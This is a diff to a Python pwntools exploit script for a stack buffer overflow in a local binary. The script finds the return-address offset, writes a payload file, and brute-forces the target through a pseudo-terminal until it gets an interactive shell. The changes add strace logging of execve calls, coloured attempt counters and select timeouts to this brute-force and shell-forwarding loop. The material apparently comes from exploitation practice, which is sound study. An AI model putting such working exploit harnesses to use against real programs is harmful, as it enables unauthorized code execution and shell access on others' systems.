@@ -7,6 +7,10 @@ import pty
 import select
 from pwn import *
 
+PINK = "\033[95m"
+RESET = "\033[0m"
+
+
 
 def stack_middle_address(output):
 
@@ -109,6 +113,31 @@ def construct_payload(offset, vuln):
 
     open("vuln_payload", "wb").write(payload)
 
+def attach_strace():
+    main_pid = os.getpid()
+    strace_command = f"strace -f -e execve -p {str(main_pid)} -o strace.log"
+
+    #all error logs to devnull to keep stdout clean
+    with open(os.devnull, 'w') as devnull:
+        subprocess.Popen(strace_command, shell=True, stderr=devnull)
+    
+def print_last_10_lines():
+    # Path to the log file
+    log_file_path = 'strace.log'
+
+    try:
+        with open(log_file_path, 'r') as log_file:
+            # Read all lines in the file
+            lines = log_file.readlines()
+            # Print the last 10 lines
+            print("Last 10 lines of the log file:")
+            for line in lines[-10:]:
+                print(line, end='')
+    except FileNotFoundError:
+        print(f"Log file {log_file_path} not found.")
+    except Exception as e:
+        print(f"An error occurred while reading the log file: {e}")
+
 def main():
         
     if len(sys.argv) != 2:
@@ -123,12 +152,14 @@ def main():
     ra_offset = locate_ra(generate_test())
     print(f"ra offset: {ra_offset}")
     construct_payload(ra_offset, vuln)
+    attach_strace()
+
 
     #performing brute force attack
     exploit_command = f"cat vuln_payload - | ./{vuln} `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash`"
     i = 0
     while True:
-        # print(f"i: {i}")
+        print(f"{PINK}i: {i}{RESET}")
         i += 1
 
         master_fd, slave_fd = pty.openpty()
@@ -136,50 +167,52 @@ def main():
         exploit_proc = subprocess.Popen(exploit_command, shell=True, stderr=slave_fd, stdin=slave_fd, stdout=slave_fd, close_fds=True)
         os.write(master_fd, b'\n')
 
+        print(f"\033[94mexploit proc pid: {exploit_proc.pid}\033[0m")
+
+        print_last_10_lines()
+
         while True:
-                rlist, _, _ = select.select([master_fd, 0], [], [])
-                # status = exploit_proc.poll()        #why is the status still None after segmentation fault??
-                # print(f"process status: {status}")
+            rlist, _, _ = select.select([master_fd, 0], [], [])
 
-                if master_fd in rlist:
-                    try:
-                        output = os.read(master_fd, 100000)
-                        if output:
-                            # os.write(1, output)  # Write the process output to stdout (1)
-                            if b'Segmentation fault' in output:           #must change, must retrieve the exit code of the process (139)
-                                exploit_proc.terminate()
-                                break
+            if master_fd in rlist:
+                try:
+                    output = os.read(master_fd, 100000)
+                    if output:
+                        # os.write(1, output)  # Write the process output to stdout (1)
+                        if b'Segmentation fault' in output:           #must change, must retrieve the exit code of the process (139)
+                            exploit_proc.terminate()
+                            break
+                    else:
+                        break  # Process has exited
+                except OSError:
+                    break
 
-                        else:
-                            break  # Process has exited
-                    except OSError:
-                        break
+            if 0 in rlist:
+                #exploit took place successfully
+                while True:
+                    os.write(1, b'# ')
+                    user_input = os.read(0, 5000)
+                    
+                    if b'exit' in user_input:
+                            exploit_proc.terminate()
+                            os.close(master_fd)
+                            os.close(slave_fd)
+                            os.remove("trash")
+                            os.remove("vuln_payload")
+                            # os.remove("strace.log")
+                            sys.exit(1)
+                    
+                    os.write(master_fd, user_input)  # Forward user input to the exploit shell
+                    rlist_response, _, _ = select.select([master_fd], [], [], 0.1)
 
-                if 0 in rlist:
-                    #exploit took place successfully
-                    while True:
-                        os.write(1, b'# ')
-                        user_input = os.read(0, 5000)
-                        
-                        if b'exit' in user_input:
-                                exploit_proc.terminate()
-                                os.close(master_fd)
-                                os.close(slave_fd)
-                                os.remove("trash")
-                                os.remove("vuln_payload")
-                                sys.exit(1)
-                        
-                        os.write(master_fd, user_input)  # Forward user input to the exploit shell
-                        rlist_response, _, _ = select.select([master_fd], [], [])
+                    while master_fd in rlist_response:
+                        response = os.read(master_fd, 1024)
+                        response = response.replace(b'\r', b'')
+                        if response != user_input:
+                            os.write(1, response)
+                            break
 
-                        while master_fd in rlist_response:
-                            response = os.read(master_fd, 1024)
-                            response = response.replace(b'\r', b'')
-                            if response != user_input:
-                                os.write(1, response)
-                                break
-
-                            rlist_response, _, _ = select.select([master_fd], [], [])
+                        rlist_response, _, _ = select.select([master_fd], [], [], 0.1)
 
         # Close the PTY file descriptors
         os.close(master_fd)
